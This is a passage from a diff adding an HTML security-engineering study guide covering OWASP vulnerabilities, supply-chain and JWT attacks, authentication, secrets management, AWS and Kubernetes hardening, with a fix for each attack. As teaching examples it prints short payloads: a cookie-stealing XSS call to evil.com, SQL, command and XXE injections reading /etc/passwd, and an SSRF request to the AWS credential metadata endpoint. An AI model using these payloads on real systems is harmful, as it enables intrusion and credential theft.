+      <p class="body"><strong>CAA (Certification Authority Authorisation):</strong> DNS record specifying which CAs are allowed to issue TLS certificates for your domain. <code>0 issue "letsencrypt.org"</code> prevents any other CA from issuing a cert for your domain even if they're tricked or compromised.</p>
+    </div>
+
+    <!-- 04 APPLICATION SECURITY -->
+    <div id="appsec" class="sec">
+      <div class="sec-head"><span class="sec-num">04</span><h2 class="sec-title">Application Security</h2></div>
+
+      <p class="body">Most breaches exploit application layer vulnerabilities, not network layer. OWASP Top 10 is the canonical reference. As an engineer, your job is to understand the root cause of each vulnerability class — not just "use a parameterised query" but why SQL injection happens and how every variant of it works.</p>
+
+      <h3 class="sub">OWASP Top 10 — Deep Dive</h3>
+
+      <div class="atk" id="sqli">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-critical">Critical</span>
+          <span class="atk-title">A03 — Injection (SQL, Command, LDAP, XPath)</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>Root cause:</strong> user-controlled data is interpreted as code. The interpreter (SQL engine, shell, LDAP server) cannot distinguish data from commands when they're concatenated together.</p>
+          <p><strong>SQL Injection:</strong> input <code>'; DROP TABLE users; --</code> injected into <code>"SELECT * FROM users WHERE id = " + input</code> executes as two SQL statements. Classic, but stacked query injection, blind SQLi (boolean-based, time-based), and out-of-band SQLi are more common in modern apps because error messages are suppressed.</p>
+          <p><strong>Blind SQLi example:</strong> <code>id=1 AND SLEEP(5)</code> — if the response is delayed 5 seconds, the injection worked. Attacker extracts data one bit at a time by asking true/false questions: <code>AND SUBSTRING(password,1,1)='a'</code>.</p>
+          <p><strong>Second-order SQLi:</strong> malicious input is stored safely (parameterised), then later retrieved and used unsafely in a different query. Scanning for SQLi at insertion time misses this.</p>
+          <p><strong>Fix — always parameterised queries:</strong> the SQL engine compiles the query before binding parameters. User input can never be interpreted as SQL syntax.</p>
+          <p><strong>Command injection:</strong> <code>os.system("ping " + user_input)</code> — input <code>; cat /etc/passwd</code> executes the second command. Fix: never pass user input to a shell. Use subprocess with argument arrays (no shell=True in Python).</p>
+        </div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-critical">Critical</span>
+          <span class="atk-title">A01 — Broken Access Control (IDOR, Privilege Escalation)</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>IDOR (Insecure Direct Object Reference):</strong> <code>GET /api/invoice/1042</code> returns invoice 1042 regardless of who's asking. Changing the ID to 1043 returns another user's invoice. The most common critical vulnerability in modern APIs.</p>
+          <p><strong>Why it happens:</strong> the developer wrote authorisation for the happy path ("is the user logged in?") but not for the data access ("does this user own invoice 1042?"). Authorisation at the route level is insufficient — you need object-level authorisation on every data access.</p>
+          <p><strong>Fix:</strong> every database query that retrieves user-owned data must include the requesting user's ID in the WHERE clause: <code>WHERE id = ? AND owner_id = current_user_id</code>. Use scoped repositories that enforce this automatically.</p>
+          <p><strong>Horizontal vs vertical privilege escalation:</strong> horizontal = accessing another user's data at the same privilege level (IDOR). Vertical = accessing functionality at a higher privilege level (regular user calling admin endpoint). Both require the same fix: explicit authorisation checks on every request, not just at authentication.</p>
+          <p><strong>Mass assignment:</strong> API accepts <code>{"role": "admin"}</code> in a user update request and blindly maps it to the model. Fix: whitelist accepted fields — never bind the entire request body to a model without filtering.</p>
+        </div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-critical">Critical</span>
+          <span class="atk-title">A02 — Cryptographic Failures (Sensitive Data Exposure)</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>Transmitting data in clear text:</strong> HTTP instead of HTTPS, FTP instead of SFTP, unencrypted database connections. Any network hop between client and server — including internal hops between microservices — should be encrypted.</p>
+          <p><strong>Weak password storage:</strong> storing passwords in plain text, with MD5/SHA-1 (reversible via rainbow tables), or without a salt (identical passwords hash identically). Use Argon2id with a random per-user salt. Never store the password — only store the hash.</p>
+          <p><strong>Hardcoded secrets:</strong> API keys, database passwords, or private keys committed to git. Scrape GitHub for your org's repos using truffleHog, gitleaks, or similar. Once a secret is in git history, assume it's compromised — rotate it even if the repo is private.</p>
+          <p><strong>Insufficient key management:</strong> encrypting data but storing the encryption key next to the encrypted data (like putting the safe key inside the safe). Use a KMS (AWS KMS, GCP Cloud KMS, HashiCorp Vault) — the encryption key should be managed separately from the data it protects.</p>
+        </div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-high">High</span>
+          <span class="atk-title">A07 — XSS (Cross-Site Scripting)</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>Root cause:</strong> user-controlled data is rendered as HTML without encoding. The browser executes injected scripts in the context of the vulnerable site — with access to cookies, localStorage, and the ability to make requests as the victim.</p>
+          <p><strong>Reflected XSS:</strong> malicious input from the URL is immediately reflected in the response: <code>https://app.com/search?q=&lt;script&gt;document.cookie&lt;/script&gt;</code>. Delivered via phishing links.</p>
+          <p><strong>Stored XSS:</strong> malicious input is stored in the database and served to all users who view it. A comment <code>&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code> runs for every user who views the comment. More dangerous than reflected — no victim interaction required beyond viewing a page.</p>
+          <p><strong>DOM XSS:</strong> no server involvement — JavaScript reads attacker-controlled data (URL hash, postMessage) and writes it to the DOM via <code>innerHTML</code>, <code>document.write</code>, or <code>eval</code>. Not visible in server-side scanning.</p>
+          <p><strong>Fix:</strong> context-aware output encoding (HTML entity encoding for HTML context, JavaScript string encoding for JS context). Use a framework that encodes by default (React escapes JSX expressions). CSP (Content Security Policy) as a defence-in-depth layer — <code>script-src 'self'</code> blocks inline scripts even if XSS injection succeeds.</p>
+          <p><strong>HttpOnly + Secure flags on cookies:</strong> <code>HttpOnly</code> prevents JavaScript from reading the cookie — XSS cannot steal session cookies. <code>Secure</code> prevents the cookie being sent over HTTP. <code>SameSite=Strict</code> prevents the cookie being sent in cross-site requests.</p>
+        </div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-high">High</span>
+          <span class="atk-title">A08 — CSRF (Cross-Site Request Forgery)</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>Root cause:</strong> a request from the victim's browser to a legitimate site is treated as authorised because the browser automatically attaches the session cookie. An attacker on a different origin can force the victim's browser to make requests to the target site.</p>
+          <p><strong>Example:</strong> victim is logged into bank.com. Attacker's site contains <code>&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=1000"&gt;</code>. When the victim visits the attacker's page, their browser sends the GET request with their bank session cookie attached.</p>
+          <p><strong>Fix 1 — CSRF tokens:</strong> include a secret token in every state-changing form/request. The server validates the token before processing. An attacker on a different origin cannot read the token (same-origin policy) and cannot forge the request.</p>
+          <p><strong>Fix 2 — SameSite=Strict cookies:</strong> the browser won't send the cookie for cross-site requests. Simpler than CSRF tokens. <code>SameSite=Lax</code> (default in modern browsers) blocks most CSRF but allows safe top-level navigations.</p>
+          <p><strong>Fix 3 — Origin/Referer header validation:</strong> reject requests where Origin or Referer doesn't match expected values. Not sufficient alone but useful as defence-in-depth.</p>
+        </div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-high">High</span>
+          <span class="atk-title">A10 — SSRF (Server-Side Request Forgery)</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>Root cause:</strong> the server makes HTTP requests to a URL supplied (directly or indirectly) by the user. From the server's perspective, these requests originate from a trusted internal network.</p>
+          <p><strong>Attack:</strong> attacker provides <code>url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. In AWS, this URL returns the EC2 instance's IAM credentials — keys with whatever permissions the instance role has. Capital One breach (2019) was primarily SSRF exploiting the instance metadata service.</p>
+          <p><strong>Other SSRF targets:</strong> internal services (Redis on localhost:6379, Elasticsearch on 9200, Kubernetes API on 10.0.0.1:443), internal admin panels not exposed to the internet, cloud metadata endpoints (169.254.169.254 for AWS/GCP, 100.100.100.200 for Alibaba).</p>
+          <p><strong>Fix:</strong> validate and allowlist URLs before making requests. Block requests to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16). Use IMDSv2 on AWS (requires a token exchange — not vulnerable to naive SSRF). Never use raw user input as a URL.</p>
+        </div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-high">High</span>
+          <span class="atk-title">XXE — XML External Entity Injection</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>Root cause:</strong> XML parsers by default resolve external entity references — references that can point to local files or remote URLs. Attacker-controlled XML can read arbitrary files from the server.</p>
+          <p><strong>Payload:</strong> <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code>. If the application returns parsed XML content, the /etc/passwd file is included in the response.</p>
+          <p><strong>Blind XXE via SSRF:</strong> same pattern but attacker controls a remote server. The XML entity points to the attacker's server with the stolen file contents in the URL parameters — works even when the app doesn't return parsed XML.</p>
+          <p><strong>Fix:</strong> disable external entity processing and DTD processing in your XML parser. In Java: <code>factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)</code>. In Python's lxml: use <code>resolve_entities=False</code>. Prefer JSON over XML for new APIs.</p>
+        </div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-head" onclick="toggleAtk(this)">
+          <span class="atk-sev sev-high">High</span>
+          <span class="atk-title">Deserialization Attacks — RCE via Object Injection</span>
+          <span class="atk-chevron">▼</span>
+        </div>
+        <div class="atk-body">
+          <p><strong>Root cause:</strong> deserialising attacker-controlled data with a native serialisation format (Java's ObjectInputStream, Python's pickle, PHP's unserialize) can trigger arbitrary code execution. The deserialiser doesn't just parse data — it reconstructs objects, calling constructors and magic methods in the process.</p>
+          <p><strong>Java example:</strong> many Java libraries (Apache Commons Collections, Spring, etc.) have "gadget chains" — sequences of Java classes that, when chained together, result in arbitrary code execution during deserialisation. ysoserial is a tool for generating these payloads. Any Java application that deserialises untrusted data using Java serialisation is likely vulnerable.</p>
+          <p><strong>Python pickle:</strong> <code>pickle.loads(attacker_data)</code> can execute arbitrary Python code because pickle can encode arbitrary Python callables. Never unpickle data from an untrusted source.</p>
+          <p><strong>Fix:</strong> don't deserialise untrusted data with native serialisation. Use JSON or Protobuf. If you must use native deserialisation, validate integrity with HMAC before deserialising. Use a security manager (Java) to restrict what the deserialised object can do.</p>
+        </div>
+      </div>
+
+      <h3 class="sub">Secure Coding — Headers</h3>
+      <div class="code-wrap">
+        <div class="code-head"><span class="code-lang">go — security headers middleware</span><button class="copy-btn">copy</button></div>
+        <pre><span class="tc">// Every HTTP response should include these headers</span>
+<span class="tk">func</span> <span class="tf">SecurityHeaders</span>(next http.Handler) http.Handler {
+  <span class="tk">return</span> http.HandlerFunc(<span class="tk">func</span>(w http.ResponseWriter, r *http.Request) {
+    <span class="tc">// Prevent MIME type sniffing — browser obeys Content-Type exactly</span>
+    w.Header().Set(<span class="ts">"X-Content-Type-Options"</span>, <span class="ts">"nosniff"</span>)
+
+    <span class="tc">// Prevent iframe embedding (clickjacking)</span>
+    w.Header().Set(<span class="ts">"X-Frame-Options"</span>, <span class="ts">"DENY"</span>)
+
+    <span class="tc">// Force HTTPS for 2 years, include subdomains, allow preload</span>
+    w.Header().Set(<span class="ts">"Strict-Transport-Security"</span>,
+      <span class="ts">"max-age=63072000; includeSubDomains; preload"</span>)
+
+    <span class="tc">// CSP: only allow scripts/styles from own origin</span>
+    <span class="tc">// nonce-based CSP for inline scripts is even stronger</span>
+    w.Header().Set(<span class="ts">"Content-Security-Policy"</span>,
+      <span class="ts">"default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'"</span>)
+
+    <span class="tc">// Disable referrer for cross-origin requests</span>
+    w.Header().Set(<span class="ts">"Referrer-Policy"</span>, <span class="ts">"strict-origin-when-cross-origin"</span>)
+
+    <span class="tc">// Prevent browser features being used in iframes</span>
+    w.Header().Set(<span class="ts">"Permissions-Policy"</span>,
+      <span class="ts">"geolocation=(), microphone=(), camera=()"</span>)
+
+    <span class="tc">// Remove server fingerprinting</span>
+    w.Header().Del(<span class="ts">"Server"</span>)
+    w.Header().Del(<span class="ts">"X-Powered-By"</span>)
+
+    next.ServeHTTP(w, r)
+  })
+}</pre>
+      </div>
+    </div>
+
+    <!-- 05 ATTACKS -->
+    <div id="attacks" class="sec">
+      <div class="sec-head"><span class="sec-num">05</span><h2 class="sec-title">Attack Taxonomy — Beyond OWASP</h2></div>
+
+      <h3 class="sub">Supply Chain Attacks</h3>
+      <p class="body">Instead of attacking your application directly, attackers compromise a dependency you trust. SolarWinds (2020): malicious code inserted into the SolarWinds Orion build pipeline — distributed to 18,000+ organisations as a legitimate software update. XZ Utils (2024): two years of social engineering to gain maintainer access, then backdoor inserted into a compression library used in most Linux distributions.</p>
+      <p class="body"><strong>Typosquatting:</strong> <code>reqeusts</code> instead of <code>requests</code> in pip. The fake package may install malware or exfiltrate environment variables. Thousands of npm/PyPI packages with typosquatted names exist.</p>
+      <p class="body"><strong>Dependency confusion:</strong> attacker publishes a malicious package to a public registry with the same name as your private internal package, with a higher version number. Package managers that check public registries first will install the malicious package instead of your internal one.</p>
+      <p class="body"><strong>Mitigations:</strong> pin dependencies to exact hashes (not just version numbers), use <code>pip install --require-hashes</code> or <code>npm ci</code> with lockfile, sign your packages (Sigstore/cosign), run dependency scanning (Dependabot, Snyk, OWASP Dependency-Check), review new dependencies before adding them.</p>
+
+      <h3 class="sub">Social Engineering</h3>
+      <p class="body"><strong>Phishing:</strong> fraudulent email/SMS that tricks victims into clicking a malicious link, entering credentials, or installing malware. Spear phishing targets specific individuals with personalised content. Business email compromise (BEC) impersonates executives to authorise fraudulent transfers.</p>
+      <p class="body"><strong>Vishing (voice phishing):</strong> attacker calls an employee posing as IT support, a vendor, or a manager. Used to extract passwords, one-time codes, or authorise actions. Uber breach (2022) involved an attacker calling an employee, claiming to be IT, and convincing them to approve a MFA push notification.</p>
+      <p class="body"><strong>Mitigation:</strong> security awareness training, phishing simulation, out-of-band verification for sensitive requests (never reset a password based on an email alone — call back on a known number), hardware security keys (phishing-resistant MFA).</p>
+
+      <h3 class="sub">Timing Attacks</h3>
+      <p class="body">A side-channel attack that extracts secret information by measuring how long operations take. Password comparison that returns early on the first mismatch leaks information about the password via response time. An attacker sending 10,000 requests can statistically determine the correct value one character at a time.</p>
+      <p class="body"><strong>Mitigation:</strong> constant-time comparison for all security-sensitive comparisons. In Go: <code>subtle.ConstantTimeCompare()</code>. In Python: <code>hmac.compare_digest()</code>. Never use <code>==</code> for tokens, HMAC values, or passwords.</p>
+
+      <h3 class="sub">Path Traversal</h3>
+      <p class="body"><code>GET /download?file=../../etc/passwd</code>. If the server constructs a file path by concatenating a base directory with user input, a traversal sequence climbs out of the intended directory. On Windows: <code>..\..\Windows\System32\config\SAM</code>.</p>
+      <p class="body"><strong>Fix:</strong> resolve the canonical absolute path after joining, then verify it starts with the expected base directory: <code>filepath.Clean()</code> in Go. Never use raw user input as a file path component.</p>
+
+      <h3 class="sub">JWT Attacks</h3>
+      <p class="body"><strong>Algorithm confusion (alg:none):</strong> some JWT libraries accept <code>alg: "none"</code> with no signature — an unsigned token is accepted as valid. Fix: explicitly specify the expected algorithm when verifying; never accept "none".</p>
+      <p class="body"><strong>RS256 to HS256 confusion:</strong> server uses RS256 (asymmetric). Attacker changes the header to HS256 (symmetric) and signs the token with the server's public key (which is public). If the library uses the same key for both algorithms, it will verify as valid. Fix: enforce the expected algorithm; don't use the algorithm from the token header to determine which key to use.</p>
+      <p class="body"><strong>Weak secrets:</strong> HS256 with a short or guessable secret can be brute-forced offline. A JWT is just a base64-encoded string — anyone can run hashcat against it. Use secrets with ≥256 bits of entropy. Better: use RS256 or EdDSA (Ed25519) where the private key cannot be guessed.</p>
+
+      <div class="checkpoint">
+        <div class="cp-label">Attack Knowledge Checkpoint</div>
+        <div class="cp-title">Can you answer these without notes?</div>
+        <ul class="cp-list">
+          <li class="cp-item">Difference between reflected, stored, and DOM XSS — which is hardest to detect and why?</li>
+          <li class="cp-item">Why does CSRF work even with a strong session cookie? What exactly does SameSite=Strict prevent?</li>
+          <li class="cp-item">What's the SSRF payload for AWS EC2 metadata? What does it return?</li>
+          <li class="cp-item">Explain blind SQLi — how does an attacker extract data without seeing query output?</li>
+          <li class="cp-item">Why is <code>==</code> unsafe for HMAC comparison? What's the attack and what's the fix?</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 06 AUTHN/AUTHZ -->
+    <div id="authn" class="sec">
+      <div class="sec-head"><span class="sec-num">06</span><h2 class="sec-title">Authentication and Authorisation</h2></div>
+
+      <h3 class="sub">Password Security</h3>
+      <p class="body"><strong>Storage:</strong> Argon2id with a random 16-byte per-user salt. Never MD5, SHA-1, or unsalted hashes. Never reversible encryption — you should never need to recover the original password.</p>
+      <p class="body"><strong>Credential stuffing:</strong> attacker uses username/password pairs from previous breaches against your site. Users reuse passwords. Mitigations: rate limiting on login, CAPTCHA after N failures, check passwords against HaveIBeenPwned database at registration/login (using k-anonymity — you send the first 5 chars of the SHA-1 hash, not the password).</p>
+      <p class="body"><strong>Password policies that don't work:</strong> complexity requirements (upper+lower+number+symbol) do not increase real entropy if users just capitalise the first letter and add "1!". Better: minimum length of 12+ characters, check against a blocklist of common passwords, allow passphrases.</p>
+
+      <h3 class="sub">Multi-Factor Authentication</h3>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>MFA Type</th><th>Phishing resistant?</th><th>Security level</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td>Hardware security key (FIDO2/WebAuthn)</td><td style="color:var(--teal)">✓ Yes</td><td>Highest</td><td>Key signs a challenge that includes the domain — a phishing site gets a signature for a different domain, useless. YubiKey, Google Titan. Required for highest-security accounts.</td></tr>
+            <tr><td>Passkeys (WebAuthn)</td><td style="color:var(--teal)">✓ Yes</td><td>High</td><td>Device-bound or synced (iCloud Keychain, 1Password). Same phishing resistance as hardware keys. Replaces password entirely.</td></tr>
+            <tr><td>TOTP (Authenticator app)</td><td style="color:var(--amber)">⚠ No</td><td>Good</td><td>Attacker can relay the OTP in real-time via a phishing proxy. Still far better than no MFA.</td></tr>
+            <tr><td>Push notification (Duo, Okta)</td><td style="color:var(--amber)">⚠ No</td><td>Medium</td><td>MFA fatigue attack: flood user with push requests until they approve. Mitigate with number matching.</td></tr>
+            <tr><td>SMS OTP</td><td style="color:var(--amber)">⚠ No</td><td>Low-medium</td><td>SIM swapping, SS7 attacks, phishing relay. Avoid for high-value accounts. Better than nothing.</td></tr>
+            <tr><td>Email OTP</td><td style="color:var(--amber)">⚠ No</td><td>Low</td><td>Only as strong as the email account's security. If the email is compromised, so is this factor.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 class="sub">OAuth 2.0 and OIDC</h3>
+      <p class="body"><strong>OAuth 2.0</strong> is an authorisation framework — it grants third-party applications access to user resources without sharing credentials. OIDC (OpenID Connect) is an identity layer on top of OAuth 2.0 that adds authentication (who the user is).</p>
+      <p class="body"><strong>Authorization Code Flow with PKCE</strong> is the correct flow for most applications. The access token is never in the URL (preventing it appearing in browser history or server logs). PKCE (Proof Key for Code Exchange) prevents authorisation code interception attacks.</p>
+      <p class="body"><strong>Common OAuth misconfigurations:</strong> open redirect on the redirect_uri (allows redirecting to attacker's domain after auth), missing state parameter validation (CSRF on the OAuth callback), implicit flow (access token in URL fragment — deprecated), accepting any redirect_uri without validation.</p>
+
+      <h3 class="sub">RBAC, ABAC, and ReBAC</h3>
+      <p class="body"><strong>RBAC (Role-Based Access Control):</strong> permissions attached to roles, roles assigned to users. Simple and auditable. Breaks down when you need fine-grained permissions per object ("user A can edit document X but not document Y").</p>
+      <p class="body"><strong>ABAC (Attribute-Based Access Control):</strong> access decisions based on attributes of the user, the resource, and the environment. Policy: "users with department=finance can access resources with classification=financial during business hours." Flexible but complex to audit and debug.</p>
+      <p class="body"><strong>ReBAC (Relationship-Based Access Control):</strong> access based on the relationship graph between users and resources. "Can user A access document D?" resolves by traversing: "is A a member of a group that owns a folder that contains D?" Used by Google Zanzibar (authorisation system for Google Docs, Drive, YouTube). Open-source: OpenFGA, SpiceDB.</p>
+    </div>
+
+    <!-- 07 SECRETS MANAGEMENT -->
+    <div id="secrets" class="sec">
+      <div class="sec-head"><span class="sec-num">07</span><h2 class="sec-title">Secrets Management</h2></div>
+
+      <p class="body">A secret is any value that grants access to a system or decrypts data: API keys, database passwords, TLS private keys, signing keys, OAuth client secrets. The most common security failure in cloud-native systems is secrets leaking into inappropriate places.</p>
+
+      <h3 class="sub">Where Secrets Must Not Live</h3>
+      <p class="body"><strong>Git repositories:</strong> git history is permanent. A secret committed even once is permanently in the history. Even if the repo is private: ex-employees, stolen laptops, accidental public repo. Rotate immediately if found. Use pre-commit hooks (gitleaks, detect-secrets) to prevent commits containing secrets.</p>
+      <p class="body"><strong>Container images:</strong> a Dockerfile that copies a secret into an image layer preserves it forever even if a later layer deletes it — every layer is accessible. Use multi-stage builds, build-time secrets with <code>--mount=type=secret</code>, or inject at runtime via environment variables from a secrets manager.</p>
+      <p class="body"><strong>Application logs:</strong> secrets appearing in log lines (connection strings in stack traces, API keys in debug output) are written to files, forwarded to log aggregators, accessible to many engineers. Scrub secrets from logs at the logger level.</p>
+      <p class="body"><strong>Environment variables (as primary storage):</strong> env vars are accessible to all processes, appear in <code>/proc/&lt;pid&gt;/environ</code>, and are often logged. Use them to pass the location of a secret (path to a file, Vault path) not the secret itself.</p>
+
+      <h3 class="sub">HashiCorp Vault</h3>
+      <p class="body">Vault provides secrets as a service: dynamic secrets (credentials generated on-demand with TTL, automatically expired), encryption as a service (encrypt/decrypt without exposing the key), PKI (issue short-lived TLS certificates), and secret versioning with audit logging.</p>
+      <p class="body"><strong>Dynamic secrets</strong> are the key concept. Instead of a shared database password that lives forever, each application instance requests credentials from Vault. Vault creates a new database user with the minimum required permissions and a 1-hour TTL. When the TTL expires, Vault revokes the credentials. A compromised secret is automatically expired without manual rotation.</p>
+
+      <div class="code-wrap">
+        <div class="code-head"><span class="code-lang">go — reading a secret from Vault</span><button class="copy-btn">copy</button></div>
+        <pre><span class="tc">// Service authenticates to Vault using its K8s service account token</span>
+<span class="tc">// Vault verifies the token with the K8s API, returns a Vault token</span>
+<span class="tc">// The Vault token has a policy allowing reads from specific paths</span>
+
+<span class="tk">func</span> <span class="tf">getDBCredentials</span>(ctx context.Context, vaultAddr <span class="tt">string</span>) (*DBCreds, <span class="tt">error</span>) {
+  client, _ := vault.New(vault.WithAddress(vaultAddr))
+
+  <span class="tc">// K8s auth: exchange service account JWT for a Vault token</span>
+  jwt, _ := os.ReadFile(<span class="ts">"/var/run/secrets/kubernetes.io/serviceaccount/token"</span>)
+  resp, err := client.Auth.KubernetesLogin(ctx, schema.KubernetesLoginRequest{
+    Jwt:  string(jwt),
+    Role: <span class="ts">"notification-service"</span>,
+  })
+  <span class="tk">if</span> err != <span class="tk">nil</span> { <span class="tk">return</span> <span class="tk">nil</span>, err }
+  client.SetToken(resp.Auth.ClientToken)
+
+  <span class="tc">// Read dynamic DB credentials — new creds every call, auto-expire</span>
+  secret, err := client.Secrets.Read(ctx, <span class="ts">"database/creds/notification-service"</span>)
+  <span class="tk">if</span> err != <span class="tk">nil</span> { <span class="tk">return</span> <span class="tk">nil</span>, err }
+
+  <span class="tk">return</span> &DBCreds{
+    Username: secret.Data[<span class="ts">"username"</span>].(string),
+    Password: secret.Data[<span class="ts">"password"</span>].(string),
+    TTL:      time.Duration(resp.Auth.LeaseDuration) * time.Second,
+  }, <span class="tk">nil</span>
+}</pre>
+      </div>
+
+      <h3 class="sub">Secret Rotation</h3>
+      <p class="body">All secrets should have a defined rotation schedule. API keys: 90 days maximum. Database passwords: 30 days. TLS certificates: automated via ACME (Let's Encrypt), never more than 90 days (moving toward 47-day max). Long-lived secrets are a liability — every day they exist is another day an undetected breach has active credentials.</p>
+      <p class="body"><strong>Zero-downtime rotation:</strong> add new secret alongside old one, deploy all services to accept both, revoke old secret, remove old secret acceptance. Never rotate by replacing in-place without a transition period — you'll cause outages.</p>
+    </div>
+
+    <!-- 08 CLOUD SECURITY -->
+    <div id="cloud" class="sec">
+      <div class="sec-head"><span class="sec-num">08</span><h2 class="sec-title">Cloud Security — AWS</h2></div>
+
+      <h3 class="sub">IAM — The Foundation of Cloud Security</h3>
+      <p class="body">Every action in AWS is authorised by IAM. The evaluation logic: if there is an explicit Deny anywhere in the policy chain, deny. If there is an explicit Allow and no Deny, allow. If there is neither, deny (implicit deny). This means you can never accidentally grant access by forgetting to write a deny rule.</p>
+      <p class="body"><strong>IAM best practices:</strong> no long-lived IAM user access keys for services (use IAM roles). Root account: disable access keys, enable MFA, never use for day-to-day operations. Roles: use service-linked roles for AWS services, instance profiles for EC2, IRSA (IAM Roles for Service Accounts) for EKS. Review unused permissions with IAM Access Analyser.</p>
+      <p class="body"><strong>Permission boundaries:</strong> a maximum permission ceiling on an IAM entity. Even if a role has AdministratorAccess, a permission boundary of S3ReadOnly means it can only read S3. Use permission boundaries to safely delegate IAM permission management to team leads without risk of privilege escalation.</p>
+
+      <h3 class="sub">Common AWS Misconfigurations</h3>
+      <div class="threat-grid">
+        <div class="threat-card" style="--tc-color:var(--red)">
+          <div class="tc-sev">Critical</div>
+          <div class="tc-name">Public S3 Buckets with Sensitive Data</div>
+          <div class="tc-desc">S3 bucket ACL set to public or <code>s3:GetObject</code> granted to <code>*</code>. Any data in the bucket is publicly accessible. Used in hundreds of major breaches.</div>
+          <div class="tc-mitigate">→ Block Public Access setting at account level, S3 bucket policies audit, Macie for PII detection, GuardDuty for anomalous access patterns</div>
+        </div>
+        <div class="threat-card" style="--tc-color:var(--red)">
+          <div class="tc-sev">Critical</div>
+          <div class="tc-name">IMDS v1 + SSRF = IAM credential theft</div>
+          <div class="tc-desc">IMDSv1 allows any HTTP request to 169.254.169.254 to retrieve IAM credentials. SSRF in the app becomes credential theft. Capital One breach pattern.</div>
+          <div class="tc-mitigate">→ Enforce IMDSv2 on all instances (requires token exchange, not directly SSRF-able), hop limit = 1 for containers</div>
+        </div>
+        <div class="threat-card" style="--tc-color:var(--amber)">
+          <div class="tc-sev">High</div>
+          <div class="tc-name">Overpermissive IAM Roles</div>
+          <div class="tc-desc">Services with AdministratorAccess or <code>*:*</code> permissions. A compromised service becomes a full account compromise.</div>
+          <div class="tc-mitigate">→ Least-privilege, IAM Access Analyser, quarterly permission reviews, AWS Config rules for policy drift</div>
+        </div>
+        <div class="threat-card" style="--tc-color:var(--amber)">
+          <div class="tc-sev">High</div>
+          <div class="tc-name">Security Groups with 0.0.0.0/0 Inbound</div>
+          <div class="tc-desc">Opening SSH (22), RDP (3389), or database ports (5432, 3306) to the entire internet. Bots scan and attack within minutes of creation.</div>
+          <div class="tc-mitigate">→ No internet-facing SSH (use SSM Session Manager), restrict to specific IPs or security groups, AWS Config rule: restricted-ssh</div>
+        </div>
+      </div>
+
+      <h3 class="sub">CloudTrail and Logging</h3>
+      <p class="body">CloudTrail records all API calls to AWS services — who did what, when, from where. Enable CloudTrail in all regions, store logs in a separate account the application account cannot modify (log tampering prevention), enable log file integrity validation (SHA-256 hash chain), and set a retention period of at least one year.</p>
+      <p class="body"><strong>Critical events to alert on:</strong> root account login, IAM policy changes, CloudTrail being disabled or modified, security group ingress rules opened to 0.0.0.0/0, new IAM users or access keys created, KMS key deletion scheduled, S3 bucket public access enabled.</p>
+    </div>
+
+    <!-- 09 KUBERNETES SECURITY -->
+    <div id="k8s" class="sec">
+      <div class="sec-head"><span class="sec-num">09</span><h2 class="sec-title">Kubernetes Security</h2></div>
+
+      <h3 class="sub">Pod Security — the Hardened Baseline</h3>
+      <div class="code-wrap">
+        <div class="code-head"><span class="code-lang">yaml — hardened pod security context</span><button class="copy-btn">copy</button></div>
+        <pre><span class="tk">apiVersion</span>: apps/v1
+<span class="tk">kind</span>: Deployment
+<span class="tk">spec</span>:
+  <span class="tk">template</span>:
+    <span class="tk">spec</span>:
+      <span class="tc"># No service account token unless explicitly needed</span>
+      automountServiceAccountToken: <span class="ts">false</span>
+
+      securityContext:
+        runAsNonRoot: <span class="ts">true</span>        <span class="tc"># never run as root</span>
+        runAsUser: <span class="tn">10001</span>            <span class="tc"># non-root UID</span>
+        runAsGroup: <span class="tn">10001</span>
+        fsGroup: <span class="tn">10001</span>
+        seccompProfile:
+          type: RuntimeDefault    <span class="tc"># restrict syscalls to common set</span>
+
+      containers:
+      - name: app
+        securityContext:
+          allowPrivilegeEscalation: <span class="ts">false</span>  <span class="tc"># can't gain more privileges</span>
+          readOnlyRootFilesystem: <span class="ts">true</span>    <span class="tc"># container FS is immutable</span>
+          capabilities:
+            drop: [<span class="ts">"ALL"</span>]              <span class="tc"># drop all Linux capabilities</span>
+            add: []                    <span class="tc"># add none back</span>
+          privileged: <span class="ts">false</span>
+        <span class="tc"># If the container needs to write, use an explicit emptyDir volume</span>
+        volumeMounts:
+        - name: tmp
+          mountPath: /tmp
+      volumes:
+      - name: tmp
+        emptyDir: {}</pre>
+      </div>
+
+      <h3 class="sub">RBAC and Network Policies</h3>
